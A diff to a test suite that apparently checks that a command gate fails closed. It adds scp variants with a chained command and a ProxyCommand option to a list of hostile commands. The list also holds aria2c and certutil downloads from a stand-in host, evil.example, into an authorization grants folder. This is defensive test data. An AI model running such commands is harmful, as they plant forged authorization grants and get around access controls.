@@ -566,6 +566,8 @@ describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
     const seams = uatSeams();
     for (const command of [
       "scp host:g.json .deft/authz/grants/evil.json",
+      "scp host:g.json .deft/authz/grants/evil.json ; echo ok",
+      "scp -o ProxyCommand=none host:g.json .deft/authz/grants/evil.json",
       "aria2c -o evil.json -d .deft/authz/grants https://evil.example/g.json",
       "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
       "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
